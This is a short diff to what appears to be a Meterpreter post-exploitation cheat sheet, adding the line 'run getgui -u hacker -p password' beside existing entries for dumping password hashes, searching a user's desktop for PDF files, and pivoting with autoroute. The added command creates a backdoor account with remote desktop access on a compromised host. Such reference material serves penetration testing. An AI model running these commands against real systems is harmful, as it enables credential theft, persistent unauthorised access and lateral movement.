@@ -223,6 +223,8 @@ hashdump                                      Dump password hashes.
 
 search -d c:\\documents\ and\ settings\\<user>\\desktop\\ -f *.pdf
 
+run getgui -u hacker -p password
+
 ipconfig                                      Look for dual-homed connections.
 autoroute -s <new CIDR range>                 If dual-homed.
 autoroute -p                                  Print routing table.
